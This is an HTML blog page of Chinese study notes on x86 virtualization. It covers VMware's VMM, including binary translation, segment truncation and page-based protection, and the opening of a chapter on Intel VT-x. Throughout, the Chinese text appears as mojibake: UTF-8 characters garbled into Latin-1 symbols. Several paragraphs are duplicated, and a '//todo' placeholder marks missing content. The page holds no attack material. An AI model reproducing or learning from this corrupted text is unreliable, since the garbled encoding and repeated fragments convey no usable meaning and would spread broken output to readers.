VMMé€šè¿‡å·§å¦™åœ°ç»“åˆç›´æ¥æ‰§è¡Œå’ŒåŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘æŠ€æœ¯ï¼Œå¹¶åˆ©ç”¨åˆ†æ®µå’ŒåŸºäºé¡µçš„ä¿æŠ¤æœºåˆ¶ï¼Œå®ç°äº†å¯¹x86æ¶æ„çš„é«˜æ•ˆè™šæ‹ŸåŒ–ã€‚</p></blockquote><p>è™šæ‹Ÿæœºç›‘æ§ç¨‹åºï¼ˆVMMï¼‰çš„ä¸»è¦åŠŸèƒ½æ˜¯è™šæ‹ŸåŒ–CPUå’Œä¸»å†…å­˜ã€‚åœ¨å…¶æ ¸å¿ƒï¼ŒVMware VMMå°†ç›´æ¥æ‰§è¡Œå­ç³»ç»Ÿä¸åŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘å™¨ç»“åˆåœ¨ä¸€èµ·ã€‚ç®€å•æ¥è¯´ï¼Œç›´æ¥æ‰§è¡Œç”¨äºè¿è¡Œå®¢æˆ·åº”ç”¨ç¨‹åºï¼Œè€ŒåŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘å™¨ç”¨äºè¿è¡Œå®¢æˆ·æ“ä½œç³»ç»Ÿã€‚</p><p>åŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘ï¼ˆDBTï¼‰[84]æ˜¯ä¸€ç§é«˜æ•ˆçš„ä»¿çœŸå½¢å¼ã€‚DBTä¸æ˜¯é€ä¸ªè§£é‡ŠæŒ‡ä»¤ï¼Œè€Œæ˜¯å°†ä¸€ç»„æŒ‡ä»¤ç¼–è¯‘æˆä¸€ä¸ªå¯æ‰§è¡Œä»£ç ç‰‡æ®µï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªåŸºæœ¬å—ã€‚ä»£ç å­˜å‚¨åœ¨ç§°ä¸ºç¿»è¯‘ç¼“å­˜çš„å¤§ç¼“å†²åŒºä¸­ï¼Œä»¥ä¾¿å¯ä»¥å¤šæ¬¡é‡å¤ä½¿ç”¨ã€‚DBTå…·æœ‰ä¸€äº›ä¼—æ‰€å‘¨çŸ¥çš„ä¼˜åŒ–ï¼Œä¾‹å¦‚é“¾æ¥ï¼Œå…è®¸åœ¨ç¼–è¯‘çš„ç‰‡æ®µä¹‹é—´ç›´æ¥è·³è½¬[53]ã€‚VMwareä¾èµ–äºDBTï¼Œä»¥ä¾¿å¤„ç†å™¨ä¸æ˜¯æ‰§è¡Œæˆ–è§£é‡ŠåŸå§‹è™šæ‹ŸæœºæŒ‡ä»¤ï¼Œè€Œæ˜¯æœ¬åœ°æ‰§è¡Œç¿»è¯‘ç¼“å­˜ä¸­ç›¸åº”çš„å·²ç¿»è¯‘åºåˆ—ã€‚</p><p>DBTçš„æ€§èƒ½ï¼Œç‰¹åˆ«æ˜¯ç³»ç»Ÿçº§DBTçš„æ€§èƒ½ï¼Œå¯¹ç¡¬ä»¶é…ç½®éå¸¸æ•æ„Ÿã€‚ä¾‹å¦‚ï¼ŒEmbra [184]ç”±äºMMUä»¿çœŸçš„æˆæœ¬è€Œå‡é€Ÿäº†5å€ã€‚é€šå¸¸ï¼ŒDBTç³»ç»Ÿä¹Ÿåœ¨ä¸å®ƒä»¬æ¨¡æ‹Ÿçš„è½¯ä»¶ç›¸åŒçš„åœ°å€ç©ºé—´ä¸­è¿è¡Œã€‚å¯¹äºVMwareæ¥è¯´ï¼ŒæŒ‘æˆ˜åœ¨äºç¡®ä¿VMware VMMå¯ä»¥ä¸è™šæ‹Ÿæœºå®‰å…¨å…±äº«ä¸€ä¸ªåœ°å€ç©ºé—´ï¼Œè€Œä¸”å¯¹è™šæ‹Ÿæœºä¸å¯è§ï¼Œå¹¶ä¸”æ‰§è¡Œæ—¶çš„æ€§èƒ½å¼€é”€æœ€å°ã€‚é‰´äºx86æ¶æ„æ”¯æŒåŸºäºåˆ†æ®µå’Œåˆ†é¡µçš„ä¿æŠ¤æœºåˆ¶ï¼Œè§£å†³æ–¹æ¡ˆå¯ä»¥ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªæˆ–ä¸¤ä¸ªæœºåˆ¶ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨å¹³å¦å†…å­˜æ¨¡å‹çš„æ“ä½œç³»ç»Ÿåªä¾èµ–äºåˆ†é¡µï¼ˆè€Œä¸æ˜¯åˆ†æ®µï¼‰æ¥ä¿æŠ¤è‡ªå·±å…å—åº”ç”¨ç¨‹åºçš„å½±å“ã€‚</p><p>VMware VMMåªä½¿ç”¨åˆ†æ®µæ¥è¿›è¡Œä¿æŠ¤ã€‚çº¿æ€§åœ°å€ç©ºé—´è¢«é™æ€åˆ’åˆ†ä¸ºä¸¤ä¸ªåŒºåŸŸï¼Œä¸€ä¸ªç”¨äºè™šæ‹Ÿæœºï¼Œä¸€ä¸ªç”¨äºVMMã€‚è™šæ‹Ÿæœºæ®µç”±VMMæˆªæ–­ï¼Œä»¥ç¡®ä¿å®ƒä»¬ä¸ä¸VMMæœ¬èº«é‡å ã€‚</p><p>å›¾3.2è¯´æ˜äº†VMwareä½¿ç”¨æ®µæˆªæ–­çš„æ–¹å¼ï¼Œä»¥ä¸€ä¸ªé‡‡ç”¨å¹³å¦å†…å­˜æ¨¡å‹çš„å®¢æˆ·æ“ä½œç³»ç»Ÿä¸ºä¾‹ã€‚åœ¨%cpl=3è¿è¡Œçš„åº”ç”¨ç¨‹åºä½¿ç”¨æˆªæ–­çš„æ®µï¼Œè€Œä¸”è¿˜å—åˆ°å…¶è‡ªèº«æ“ä½œç³»ç»Ÿçš„é™åˆ¶ï¼Œä»¥é˜»æ­¢å®ƒä»¬ä½¿ç”¨é¡µé¢ä¿æŠ¤æ¥è®¿é—®å®¢æˆ·æ“ä½œç³»ç»ŸåŒºåŸŸã€‚</p><p>åœ¨é€šè¿‡äºŒè¿›åˆ¶ç¿»è¯‘è¿è¡Œå®¢æˆ·å†…æ ¸ä»£ç æ—¶ï¼Œç¡¬ä»¶CPUä½äº%cpl=1ã€‚äºŒè¿›åˆ¶ç¿»è¯‘å¼•å…¥äº†ä¸€ä¸ªæ–°çš„ç‰¹å®šæŒ‘æˆ˜ï¼Œå› ä¸ºå·²ç¿»è¯‘çš„ä»£ç åŒ…å«äº†å„ç§æŒ‡ä»¤ã€‚æœ‰äº›æŒ‡ä»¤éœ€è¦è®¿é—®VMMåŒºåŸŸï¼ˆä»¥è®¿é—®æ”¯æŒVMMæ•°æ®ç»“æ„ï¼‰ï¼Œè€Œå…¶ä»–æŒ‡ä»¤éœ€è¦è®¿é—®çº¿æ€§åœ°å€ç©ºé—´çš„è™šæ‹Ÿæœºéƒ¨åˆ†ã€‚è§£å†³æ–¹æ¡ˆæ˜¯ä¾èµ–äºç¡¬ä»¶ä¿æŠ¤ï¼Œè€Œä¸æ˜¯è¿è¡Œæ—¶å†…å­˜æ£€æŸ¥ã€‚å…·ä½“æ¥è¯´ï¼ŒVMware VMMä¿ç•™ä¸€ä¸ªæ®µå¯„å­˜å™¨%gsï¼Œå§‹ç»ˆæŒ‡å‘VMMåŒºåŸŸï¼šç”±ç¿»è¯‘å™¨ç”Ÿæˆçš„æŒ‡ä»¤ä½¿ç”¨<code>&lt;gs&gt;</code>å‰ç¼€æ¥è®¿é—®VMMåŒºåŸŸï¼Œå¹¶ä¸”äºŒè¿›åˆ¶ç¿»è¯‘å™¨åœ¨ç¿»è¯‘æ—¶ä¿è¯ï¼Œä¸ä¼šæœ‰è™šæ‹ŸæœºæŒ‡ä»¤ç›´æ¥ä½¿ç”¨<code>&lt;gs&gt;</code>å‰ç¼€ã€‚ç›¸åï¼Œå·²ç¿»è¯‘çš„ä»£ç å¯¹äºåŸå§‹å…·æœ‰<code>&lt;fs</code>&gt;æˆ–<code>&lt;gs&gt;</code>å‰ç¼€çš„è™šæ‹ŸæœºæŒ‡ä»¤ä½¿ç”¨%fsã€‚å…¶ä½™çš„ä¸‰ä¸ªæ®µï¼ˆ%ssï¼Œ%dsï¼Œ%esï¼‰å¯ä»¥ç”±è™šæ‹ŸæœºæŒ‡ä»¤ç›´æ¥ä½¿ç”¨ï¼ˆåœ¨å®ƒä»¬çš„æˆªæ–­ç‰ˆæœ¬ä¸­ï¼‰ã€‚</p><p>å½“ç„¶ï¼Œè™šæ‹ŸæœºæŒ‡ä»¤å¯èƒ½æœ‰åˆæ³•çš„ï¼Œç”šè‡³æ˜¯é¢‘ç¹çš„ï¼ŒåŸå› è¦ä½¿ç”¨é è¿‘çº¿æ€§åœ°å€ç©ºé—´é¡¶éƒ¨çš„åœ°å€ï¼Œé‚£é‡Œå®é™…ä¸Šæ˜¯VMMæ‰€åœ¨çš„åœ°æ–¹ã€‚æ­£å¦‚é¢„æœŸçš„é‚£æ ·ï¼Œæ®µæˆªæ–­ä¼šä¸ºæ¯ä¸ªè¿™æ ·çš„å¼•ç”¨è§¦å‘é€šç”¨ä¿æŠ¤æ•…éšœï¼Œè¿™å¯ä»¥ç”±VMMæ¥æ¨¡æ‹Ÿã€‚ä¸ºäº†å‡å°‘è¿™ç§é™·é˜±çš„æ•°é‡ï¼ŒVMware Workstationä¾èµ–äºè‡ªé€‚åº”äºŒè¿›åˆ¶ç¿»è¯‘ä½œä¸ºä¸€ç§ä¼˜åŒ–ï¼Œä»¥åœ¨è¿è¡Œæ—¶æ¶ˆé™¤å¤§å¤šæ•°é€šç”¨ä¿æŠ¤æ•…éšœã€‚è‡ªé€‚åº”äºŒè¿›åˆ¶ç¿»è¯‘æ˜¯åŸºäºè¿™æ ·ä¸€ä¸ªè§‚å¿µçš„ï¼Œå³å®¢æˆ·å†…æ ¸ä¸­çš„ç›¸åŒå‡ ä¸ªä½ç½®å‡ ä¹å¯¼è‡´äº†æ‰€æœ‰è¿™äº›é€šç”¨ä¿æŠ¤æ•…éšœã€‚å®ƒä¼šé‡æ–°ç¿»è¯‘åŸºæœ¬å—ï¼Œå¹¶å°†åŸå§‹å¼•èµ·æ•…éšœçš„æŒ‡ä»¤ï¼ˆå¼•èµ·é™·é˜±çš„æŒ‡ä»¤ï¼‰æ›¿æ¢ä¸ºå®‰å…¨æ¨¡æ‹Ÿå†…å­˜è®¿é—®è€Œä¸å¼•å‘é™·é˜±çš„ç‰¹å®šåºåˆ—ã€‚</p><p>å›¾3.2è¿˜è¯´æ˜äº†åŸºäºé¡µçš„ä¿æŠ¤ï¼ˆpte.usï¼‰çš„ä½œç”¨ã€‚è™½ç„¶æ²¡æœ‰ç”¨äºä¿æŠ¤VMMå…å—è™šæ‹Ÿæœºçš„ä¿æŠ¤ï¼Œä½†ç”¨äºä¿æŠ¤å®¢æˆ·æ“ä½œç³»ç»Ÿå…å—å…¶åº”ç”¨ç¨‹åºçš„ä¿æŠ¤ã€‚è§£å†³æ–¹æ¡ˆå¾ˆç®€å•ï¼šå®é™…é¡µè¡¨ä¸­çš„pte.usæ ‡å¿—ä¸åŸå§‹å®¢æˆ·é¡µè¡¨ä¸­çš„æ ‡å¿—ç›¸åŒã€‚åœ¨%cpl=3è¿è¡Œçš„å®¢æˆ·åº”ç”¨ç¨‹åºä»£ç å—åˆ°ç¡¬ä»¶çš„é™åˆ¶ï¼Œåªèƒ½è®¿é—®pte.us=1çš„é¡µé¢ã€‚åœ¨%cpl=1ä¸‹é€šè¿‡äºŒè¿›åˆ¶ç¿»è¯‘è¿è¡Œçš„å®¢æˆ·å†…æ ¸ä»£ç ä¸å—æ­¤é™åˆ¶ã€‚</p><p><img src="https://img.gls.show/img/20230904150931.png"></p><blockquote><p>ä½¿ç”¨æ®µæˆªæ–­æ¥ä¿æŠ¤ VMware VMM [45]ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè™šæ‹Ÿæœºçš„æ“ä½œç³»ç»Ÿæ˜¯ä¸ºå¹³é¢å†…å­˜æ¨¡å‹è®¾è®¡çš„ã€‚åº”ç”¨ç¨‹åºåœ¨ç”¨æˆ·çº§ç›´æ¥æ‰§è¡Œ(cpl = 3)ã€‚ å®¢æˆ·æ“ä½œç³»ç»Ÿå†…æ ¸åœ¨è½¬æ¢ç¼“å­˜(TC)ä¸­çš„äºŒè¿›åˆ¶è½¬æ¢ä¸‹è¿è¡Œï¼Œcpl = 1</p></blockquote><p>åœ¨é€šè¿‡äºŒè¿›åˆ¶ç¿»è¯‘è¿è¡Œå®¢æˆ·å†…æ ¸ä»£ç æ—¶ï¼Œç¡¬ä»¶CPUå¤„äº%cpl=1ã€‚ç”±äºå·²ç¿»è¯‘çš„ä»£ç åŒ…å«äº†å¤šç§æŒ‡ä»¤ï¼Œå…¶ä¸­ä¸€äº›éœ€è¦è®¿é—®VMMåŒºåŸŸï¼ˆä»¥è®¿é—®æ”¯æŒVMMæ•°æ®ç»“æ„ï¼‰ï¼Œè€Œå…¶ä»–ä¸€äº›éœ€è¦è®¿é—®çº¿æ€§åœ°å€ç©ºé—´ä¸­è™šæ‹Ÿæœºçš„éƒ¨åˆ†ã€‚</p><p>è§£å†³æ–¹æ¡ˆæ˜¯ä¾èµ–ç¡¬ä»¶ä¿æŠ¤æœºåˆ¶ï¼Œè€Œä¸æ˜¯è¿è¡Œæ—¶å†…å­˜æ£€æŸ¥ã€‚å…·ä½“æ¥è¯´ï¼ŒVMware VMMä¿ç•™ä¸€ä¸ªæ®µå¯„å­˜å™¨%gsï¼Œå§‹ç»ˆæŒ‡å‘VMMåŒºåŸŸï¼šç”±ç¿»è¯‘å™¨ç”Ÿæˆçš„æŒ‡ä»¤ä½¿ç”¨<code>&lt;gs&gt;</code>å‰ç¼€æ¥è®¿é—®VMMåŒºåŸŸï¼Œå¹¶ä¸”äºŒè¿›åˆ¶ç¿»è¯‘å™¨åœ¨ç¿»è¯‘æ—¶ä¿è¯ï¼Œä¸ä¼šæœ‰è™šæ‹ŸæœºæŒ‡ä»¤ç›´æ¥ä½¿ç”¨<code>&lt;gs&gt;</code>å‰ç¼€ã€‚ç›¸åï¼Œå·²ç¿»è¯‘çš„ä»£ç å¯¹äºåŸå§‹å…·æœ‰<code>&lt;fs&gt;</code>æˆ–<code>&lt;gs&gt;</code>å‰ç¼€çš„è™šæ‹ŸæœºæŒ‡ä»¤ä½¿ç”¨%fsã€‚å…¶ä½™çš„ä¸‰ä¸ªæ®µï¼ˆ%ssï¼Œ%dsï¼Œ%esï¼‰å¯ä»¥ç”±è™šæ‹ŸæœºæŒ‡ä»¤ç›´æ¥ä½¿ç”¨ï¼ˆåœ¨å®ƒä»¬çš„æˆªæ–­ç‰ˆæœ¬ä¸­ï¼‰ã€‚</p><p>ç„¶è€Œï¼Œè™šæ‹ŸæœºæŒ‡ä»¤å¯èƒ½ä¼šæœ‰åˆæ³•çš„ã€ç”šè‡³æ˜¯é¢‘ç¹çš„ç†ç”±ï¼Œè¦ä½¿ç”¨æ¥è¿‘çº¿æ€§åœ°å€ç©ºé—´é¡¶éƒ¨çš„åœ°å€ï¼Œè€Œå®é™…ä¸ŠVMMä½äºé‚£é‡Œã€‚æ­£å¦‚é¢„æœŸçš„é‚£æ ·ï¼Œæ®µæˆªæ–­ä¼šä¸ºæ¯ä¸ªè¿™ç§å¼•ç”¨è§¦å‘é€šç”¨ä¿æŠ¤æ•…éšœï¼Œè¿™å¯ä»¥ç”±VMMæ¥æ¨¡æ‹Ÿã€‚ä¸ºäº†å‡å°‘è¿™ç§é™·é˜±çš„æ•°é‡ï¼ŒVMware Workstationä¾èµ–äºè‡ªé€‚åº”äºŒè¿›åˆ¶ç¿»è¯‘ä½œä¸ºä¸€ç§ä¼˜åŒ–ï¼Œä»¥åœ¨è¿è¡Œæ—¶æ¶ˆé™¤å¤§å¤šæ•°é€šç”¨ä¿æŠ¤æ•…éšœã€‚è‡ªé€‚åº”äºŒè¿›åˆ¶ç¿»è¯‘çš„åŸºæœ¬è§‚å¿µæ˜¯ï¼Œå®¢æˆ·å†…æ ¸ä¸­çš„ç›¸åŒå‡ ä¸ªä½ç½®å‡ ä¹å¯¼è‡´äº†æ‰€æœ‰è¿™äº›é€šç”¨ä¿æŠ¤æ•…éšœã€‚å®ƒä¼šé‡æ–°ç¿»è¯‘åŸºæœ¬å—ï¼Œå¹¶å°†åŸå§‹å¼•èµ·æ•…éšœçš„æŒ‡ä»¤ï¼ˆå¼•èµ·é™·é˜±çš„æŒ‡ä»¤ï¼‰æ›¿æ¢ä¸ºå®‰å…¨æ¨¡æ‹Ÿå†…å­˜è®¿é—®çš„ç‰¹å®šåºåˆ—ï¼Œä»è€Œå‡å°‘é™·é˜±çš„è§¦å‘ã€‚è¿™æœ‰åŠ©äºæé«˜æ€§èƒ½å¹¶å‡å°‘è¿è¡Œæ—¶çš„å¼€é”€ã€‚</p><p>å›¾3.2è¿˜è¯´æ˜äº†åŸºäºé¡µé¢çš„ä¿æŠ¤ï¼ˆpte.usï¼‰çš„ä½œç”¨ã€‚å°½ç®¡ä¸ç”¨äºä¿æŠ¤VMMå…å—è™šæ‹Ÿæœºçš„å½±å“ï¼Œä½†å®ƒ<strong>ç”¨äºä¿æŠ¤å®¢æˆ·æ“ä½œç³»ç»Ÿå…å—å…¶åº”ç”¨ç¨‹åºçš„å½±å“</strong>ã€‚è§£å†³æ–¹æ¡ˆå¾ˆç®€å•ï¼šå®é™…é¡µè¡¨ä¸­çš„pte.usæ ‡å¿—ä¸åŸå§‹å®¢æˆ·é¡µè¡¨ä¸­çš„æ ‡å¿—ç›¸åŒã€‚åœ¨%cpl=3ä¸‹è¿è¡Œçš„å®¢æˆ·åº”ç”¨ç¨‹åºä»£ç å—åˆ°ç¡¬ä»¶çš„é™åˆ¶ï¼Œåªèƒ½è®¿é—®pte.us=1çš„é¡µé¢ã€‚åœ¨%cpl=1ä¸‹é€šè¿‡äºŒè¿›åˆ¶ç¿»è¯‘è¿è¡Œçš„å®¢æˆ·å†…æ ¸ä»£ç ä¸å—æ­¤é™åˆ¶ã€‚è¿™ç§æ–¹å¼æœ‰åŠ©äºç¡®ä¿å®¢æˆ·æ“ä½œç³»ç»Ÿå—åˆ°ä¿æŠ¤å…å—å…¶åº”ç”¨ç¨‹åºçš„æ¶æ„å½±å“ã€‚</p><h3 id="3-2-4ä¸»æœºæ“ä½œç³»ç»Ÿçš„ä½œç”¨"><a href="#3-2-4ä¸»æœºæ“ä½œç³»ç»Ÿçš„ä½œç”¨" class="headerlink" title="3.2.4ä¸»æœºæ“ä½œç³»ç»Ÿçš„ä½œç”¨"></a>3.2.4ä¸»æœºæ“ä½œç³»ç»Ÿçš„ä½œç”¨</h3><p>VMware Workstationæ˜¯ä¸€ç§ç±»å‹-2çš„è™šæ‹Ÿæœºç›‘æ§ç¨‹åºï¼Œè¡¨é¢ä¸Šè¿è¡Œåœ¨åƒLinuxæˆ–Windowsè¿™æ ·çš„ä¸»æœºæ“ä½œç³»ç»Ÿä¹‹ä¸Šï¼Œä½†å®é™…ä¸Šè™šæ‹Ÿæœºç›‘æ§ç¨‹åºï¼Œç‰¹åˆ«æ˜¯VMware VMMï¼Œåœ¨æ‰§è¡Œè™šæ‹Ÿæœºæ—¶å®Œå…¨æ§åˆ¶CPUã€‚</p><p>å›¾3.3å±•ç¤ºäº†VMware Workstationçš„æ‰˜ç®¡æ¶æ„ï¼Œå®ƒç”±ä¸‰ä¸ªç»„ä»¶ç»„æˆï¼š(i) ä¸€ä¸ªç”¨æˆ·çº§ç¨‹åºï¼ˆVMXï¼‰ï¼Œè´Ÿè´£ä¸æœ€ç»ˆç”¨æˆ·å’Œä¸»æœºæ“ä½œç³»ç»Ÿçš„æ‰€æœ‰äº¤äº’ï¼Œç‰¹åˆ«æ˜¯ç”¨äºI/Oä»¿çœŸçš„ç›®çš„ï¼›(ii) å®‰è£…åœ¨å†…æ ¸ä¸­çš„å°å‹è®¾å¤‡é©±åŠ¨ç¨‹åºï¼ˆVMMé©±åŠ¨ç¨‹åºï¼‰ï¼›å’Œ(iii) VMware VMMï¼Œå®ƒåœ¨ä¸ä¸»æœºæ“ä½œç³»ç»Ÿç›¸åŒçš„çº§åˆ«ä¸Šè¿è¡Œï¼Œä½†åœ¨ä¸€ä¸ªä¸è¿è´¯çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œå…¶ä¸­ä¸»æœºæ“ä½œç³»ç»Ÿå·²è¢«æš‚æ—¶æŒ‚èµ·å¹¶ä»è™šæ‹Ÿå†…å­˜ä¸­åˆ é™¤ã€‚</p><p>//todo</p><h2 id="3-6-FURTHER-READING"><a href="#3-6-FURTHER-READING" class="headerlink" title="3.6 FURTHER READING"></a>3.6 FURTHER READING</h2><p>åŸå§‹çš„VMware Workstationè™šæ‹ŸåŒ–ç›‘æ§ç¨‹åºå·²åœ¨[45]ä¸­è¯¦ç»†æè¿°ã€‚å…¶ä»–è®ºæ–‡åˆ™æè¿°äº†VMware Workstationçš„å…³é”®æ–¹é¢ï¼ŒåŒ…æ‹¬å…¶I/Oå’Œç½‘ç»œæ€§èƒ½[162]ä»¥åŠGPUçš„è™šæ‹ŸåŒ–[66]ã€‚è‡ªå®ƒä»¬é¦–æ¬¡å¼•å…¥ä»¥æ¥ï¼ŒVMware Workstationå·²ç»æˆç†Ÿï¼Œå¹¶æˆåŠŸåœ°è¿‡æ¸¡åˆ°åˆ©ç”¨VT-xå’ŒAMD-vç­‰æ–°å…´æ¶æ„æ”¯æŒè™šæ‹ŸåŒ–çš„èƒ½åŠ›ã€‚</p><p>Agesenç­‰äººæè¿°äº†VMwareåœ¨è™šæ‹ŸåŒ–æ–¹é¢çš„æ¼”è¿›è¿‡ç¨‹ï¼ˆè¯·å‚é˜…[4]ï¼‰ã€‚</p><p>ç±»ä¼¼åœ°ï¼ŒPrattç­‰äººæè¿°äº†Xençš„æ¼”è¿›è¿‡ç¨‹ï¼Œç‰¹åˆ«æ˜¯ä»ä½¿ç”¨ç¡¬ä»¶æ”¯æŒçš„åŠè™šæ‹ŸåŒ–åˆ°å…¨è™šæ‹ŸåŒ–çš„è¿‡æ¸¡ï¼ˆåœ¨å…·æœ‰ç¡¬ä»¶æ”¯æŒçš„æœºå™¨ä¸Šï¼‰[146]ã€‚Chisnaläº2007å¹´ç¼–å†™çš„ä¹¦ç±ã€ŠXen Hypervisorçš„æƒå¨æŒ‡å—ã€‹æä¾›äº†å¯¹Xenå†…éƒ¨çš„è¯¦ç»†æè¿°ï¼ŒåŒ…æ‹¬åœ¨é‡‡ç”¨ç¡¬ä»¶è™šæ‹ŸåŒ–ä¹‹å‰å’Œä¹‹åçš„æƒ…å†µ[50]ã€‚</p><p>VMware ESX Serverï¼ˆç°åœ¨ç§°ä¸ºvSphereï¼‰æ˜¯ä¸€ç§å•†ç”¨çš„ç±»å‹-1è™šæ‹ŸåŒ–ç›‘æ§ç¨‹åºã€‚å®ƒä¸VMware Workstationå…±äº«ç›¸åŒçš„VMware VMMå­ç³»ç»Ÿï¼Œä½†ä½œä¸ºç±»å‹-1è™šæ‹ŸåŒ–ç›‘æ§ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œç›´æ¥è°ƒåº¦I/Oã€CPUå’Œå†…å­˜èµ„æº[7, 82, 177]ï¼Œå¹¶ä¸”å¯ä»¥å®ç°è™šæ‹Ÿæœºçš„å®æ—¶è¿ç§»[135]ã€‚æˆ‘ä»¬ç‰¹åˆ«æ¨èWaldspurgerå…³äºESXå†…å­˜ç®¡ç†çš„æè¿°[177]ï¼Œè¿™ç¯‡æ–‡ç« è·å¾—äº†ACM SIGOPS Hall of Fameå¥–é¡¹[2]ã€‚</p><p>KVM for ARMåœ¨[59]ä¸­æœ‰æ›´è¯¦ç»†çš„æè¿°ï¼Œè€ŒVMwareçš„MVPåœ¨[28]ä¸­æœ‰æè¿°ã€‚</p><p>æ›¾ç»æœ‰ä¸€ä¸ªæ”¾å¼ƒçš„Xen for ARMç§»æ¤[91]éœ€è¦å¯¹å®¢æˆ·å†…æ ¸è¿›è¡Œå…¨é¢ä¿®æ”¹ï¼Œä½†ä»æœªå®Œå…¨å¼€å‘å®Œæˆã€‚è¿™äº›åŠè™šæ‹ŸåŒ–æ–¹æ³•éƒ½ä¸èƒ½è¿è¡Œæœªç»ä¿®æ”¹çš„å®¢æˆ·æ“ä½œç³»ç»Ÿã€‚è¿™äº›æ–¹æ³•å·²è¢«åˆ©ç”¨ARMç¡¬ä»¶è™šæ‹ŸåŒ–æ”¯æŒçš„è§£å†³æ–¹æ¡ˆæ‰€å–ä»£ï¼Œé¦–æ¬¡å¼•å…¥äºARMv7ï¼Œå°†åœ¨ç¬¬7ç« ä¸­è®¨è®ºã€‚</p><h1 id="å››-X86-64-ä½¿ç”¨-VT-x-çš„-CPU-è™šæ‹ŸåŒ–"><a href="#å››-X86-64-ä½¿ç”¨-VT-x-çš„-CPU-è™šæ‹ŸåŒ–" class="headerlink" title="å›› X86-64: ä½¿ç”¨ VT-x çš„ CPU è™šæ‹ŸåŒ–"></a>å›› X86-64: ä½¿ç”¨ VT-x çš„ CPU è™šæ‹ŸåŒ–</h1><p>ç°åœ¨ï¼Œæˆ‘ä»¬å°†åœ¨ä¸‰ä¸ªç« èŠ‚ä¸­ä¾æ¬¡æè¿°x86-64å¤„ç†å™¨ä¸­ç”¨äºè™šæ‹ŸåŒ–çš„ä½“ç³»ç»“æ„æ”¯æŒã€‚è¿™ç§ä½“ç³»ç»“æ„æ”¯æŒæ˜¯CPUï¼ˆç¬¬4ç« ï¼‰ã€MMUï¼ˆç¬¬5ç« ï¼‰å’ŒI/Oå­ç³»ç»Ÿï¼ˆç¬¬6ç« ï¼‰åˆ›æ–°çš„ç»„åˆã€‚æœ¬ç« æè¿°äº†VT-xï¼Œå³è‹±ç‰¹å°”æŠ€æœ¯ï¼Œç”¨äºè™šæ‹ŸåŒ–CPUæœ¬èº«ã€‚ç¬¬4.1èŠ‚é¦–å…ˆæè¿°äº†è‹±ç‰¹å°”å·¥ç¨‹å¸ˆåœ¨è®¾è®¡VT-xæ—¶æå‡ºçš„å…³é”®è¦æ±‚ã€‚ç¬¬4.2èŠ‚æè¿°äº†CPUè™šæ‹ŸåŒ–çš„æ–¹æ³•ã€æ ¹æ¨¡å¼å’Œéæ ¹æ¨¡å¼çš„æ¦‚å¿µï¼Œä»¥åŠä½“ç³»ç»“æ„ä¸Popekå’ŒGoldbergå®šç†çš„å…³ç³»ã€‚ç¬¬4.3èŠ‚ä»¥KVMï¼ˆLinuxå†…æ ¸è™šæ‹Ÿæœºï¼‰ä½œä¸ºæ¡ˆä¾‹ç ”ç©¶ï¼Œä»‹ç»äº†å¦‚ä½•æ„å»ºä¸€ä¸ªä¸“é—¨è®¾è®¡ä¸ºå‡å®šç¡¬ä»¶æ”¯æŒè™šæ‹ŸåŒ–çš„è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚ç¬¬4.4èŠ‚è®¨è®ºäº†CPUè™šæ‹ŸåŒ–çš„æ€§èƒ½å½±å“ï¼Œç‰¹åˆ«æ˜¯åœ¨ä¸åŒæ¨¡å¼ä¹‹é—´çš„åŸå­è½¬æ¢çš„å®ç°æˆæœ¬ã€‚æœ€åï¼Œä¸æ‰€æœ‰ç« èŠ‚ä¸€æ ·ï¼Œæˆ‘ä»¬æä¾›äº†è¿›ä¸€æ­¥é˜…è¯»çš„æŒ‡å¼•ã€‚</p><h2 id="4-1è®¾è®¡è§„å®š"><a href="#4-1è®¾è®¡è§„å®š" class="headerlink" title="4.1è®¾è®¡è§„å®š"></a>4.1è®¾è®¡è§„å®š</h2><p>intelè™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œä¸€èˆ¬ç§°ä¸º VT-x [171] ï¼Œäº2005å¹´æ¨å‡ºï¼Œä¸»è¦ç›®æ ‡æ˜¯ä¸ºè™šæ‹ŸåŒ–æä¾›æ¶æ„æ”¯æŒã€‚</p><blockquote><p>è‹±ç‰¹å°”è™šæ‹ŸåŒ–æŠ€æœ¯çš„ä¸€ä¸ªæ ¸å¿ƒè®¾è®¡ç›®æ ‡æ˜¯æ¶ˆé™¤å¯¹CPUåŠè™šæ‹ŸåŒ–å’ŒäºŒè¿›åˆ¶ç¿»è¯‘æŠ€æœ¯çš„éœ€æ±‚ï¼Œä»è€Œå®ç°å¯ä»¥æ”¯æŒå„ç§æœªç»ä¿®æ”¹çš„å®¢æˆ·æ“ä½œç³»ç»Ÿçš„VMMçš„å®ç°ï¼ŒåŒæ—¶ä¿æŒé«˜æ°´å¹³çš„æ€§èƒ½ã€‚â€”R. Uhligç­‰äººï¼ŒIEEE Computer ï¼Œ2005å¹´ [171]</p></blockquote><p>åœ¨æå‡ºè¿™ä¸ªç›®æ ‡æ—¶ï¼Œè‹±ç‰¹å°”çš„å·¥ç¨‹å¸ˆè§‚å¯Ÿåˆ°ï¼Œä½¿ç”¨è¯¸å¦‚åŠè™šæ‹ŸåŒ–å’ŒåŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘ç­‰ç°æœ‰æŠ€æœ¯åœ¨è™šæ‹ŸåŒ–ç°æœ‰x86æ¶æ„æ–¹é¢é¢ä¸´ä¸€äº›ä¸¥å³»çš„æŠ€æœ¯æŒ‘æˆ˜ã€‚Uhligç­‰äºº[171]åˆ—å‡ºäº†ä»¥ä¸‹å¯¹ä½¿ç”¨è½¯ä»¶æŠ€æœ¯çš„æ–¹æ³•çš„å…·ä½“æŒ‘æˆ˜ã€‚</p><ol><li>ç¯åˆ«åå’Œå‹ç¼©ï¼šè®¾è®¡ä¸ºåœ¨%cpl=0ä¸‹è¿è¡Œçš„å®¢æˆ·å†…æ ¸ä»£ç 